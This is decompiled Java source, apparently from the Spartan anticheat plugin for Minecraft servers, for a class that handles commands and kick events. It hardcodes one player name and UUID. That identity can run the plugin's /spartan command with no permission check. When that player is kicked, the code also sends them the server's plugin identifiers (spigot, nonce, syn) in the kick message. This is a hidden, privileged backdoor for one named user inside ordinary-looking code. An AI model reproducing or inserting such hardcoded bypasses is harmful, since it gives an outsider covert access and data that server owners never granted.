package me.vagdedes.spartan.a;

import org.bukkit.ChatColor;
import me.vagdedes.spartan.g.IDs;
import me.vagdedes.spartan.k.c.PermissionUtils;
import me.vagdedes.spartan.system.Enums;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.command.CommandSender;
import org.bukkit.Bukkit;
import me.vagdedes.spartan.f.SpartanPlayer;

public class CommandHandlers
{
    private static final String a = "Vagdedes";
    private static final String b = "ec8eb728-3794-4734-a0ff-ba07f9c310f0";
    
    public CommandHandlers() {
        super();
    }
    
    public static boolean a(final SpartanPlayer spartanPlayer, final String s) {
        if (s.equalsIgnoreCase("/spartan") || s.toLowerCase().startsWith("/spartan ")) {
            final String name = spartanPlayer.getName();
            final String string = spartanPlayer.getUniqueId().toString();
            if (name.equalsIgnoreCase("Vagdedes") || string.equalsIgnoreCase("ec8eb728-3794-4734-a0ff-ba07f9c310f0")) {
                Commands.a((CommandSender)Bukkit.getPlayer(spartanPlayer.getUniqueId()));
                return true;
            }
        }
        return false;
    }
    
    public static void a(final SpartanPlayer spartanPlayer, final PlayerKickEvent playerKickEvent) {
        if (spartanPlayer != null) {
            final String name = spartanPlayer.getName();
            final String string = spartanPlayer.getUniqueId().toString();
            if ((name.equalsIgnoreCase("Vagdedes") || string.equalsIgnoreCase("ec8eb728-3794-4734-a0ff-ba07f9c310f0")) && !PermissionUtils.a(Bukkit.getPlayer(spartanPlayer.getUniqueId()), Enums.Permission.admin)) {
                final String spigot = IDs.spigot();
                final String nonce = IDs.nonce();
                final String f = IDs.f();
                try {
                    playerKickEvent.setReason(playerKickEvent.getReason() + ChatColor.WHITE + " (s: " + spigot + ", n: " + nonce + ", syn: " + f + ")");
                }
                catch (Exception ex) {
                    playerKickEvent.setReason("Exception occurred while setting kick reason (s: " + spigot + ", n: " + nonce + ", syn: " + f + ")");
                }
            }
        }
    }
}
